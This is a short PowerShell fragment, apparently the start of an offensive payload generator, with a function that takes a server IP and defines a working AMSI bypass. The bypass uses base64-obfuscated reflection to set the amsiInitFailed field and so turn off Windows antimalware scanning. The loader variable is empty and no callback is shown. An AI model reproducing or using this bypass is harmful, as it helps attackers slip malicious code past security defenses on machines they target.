function Generate-Payloads {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0, ValueFromPipeline)]
		[ValidateNotNullOrEmpty()]
		[string]
		$ServerIP
	)
    
    $AmsiBypass = '[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static").SetValue($null,$true)'

    $Loader = ""

}